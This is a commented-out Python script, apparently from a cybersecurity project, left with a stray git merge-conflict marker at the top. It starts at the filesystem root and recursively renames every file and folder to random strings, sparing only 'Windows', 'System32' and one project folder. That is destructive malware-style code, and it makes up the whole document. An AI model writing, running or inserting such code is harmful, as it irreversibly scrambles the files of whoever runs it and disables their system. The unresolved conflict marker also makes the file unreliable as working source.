<<<<<<< HEAD
# import os, string, random
# from random import randint
# from sys import platform
#
# chars = string.ascii_uppercase + string.digits + string.ascii_lowercase
#
#
# def path():
#     return "C:\\" if "win" in platform else "/"
#
#
# def isWindows():
#     return "C:\\" == path()
#
#
# def change_name(old_filename, p):
#     weird_name = ''.join(random.choice(chars) for _ in range(randint(1, 30)))
#     new_filename = "%s%s" % (p, weird_name)
#     os.rename(old_filename, new_filename)
#
#     return new_filename
#
#
# def rename_all(p):
#     exclude = ["Cybersecu", "Windows", "System32"]
#     for i in os.listdir(p):
#         if i not in exclude:
#             file_name = "%s%s" % (p, i)
#             if os.path.isdir(file_name):
#                 file_name = change_name(file_name, p)
#                 file_name = "%s/" % (file_name)
#                 if isWindows():
#                     file_name.replace('/', '\\')
#                 rename_all(file_name)
#             else:
#                 change_name(file_name, p)
#
#
# rename_all(path())
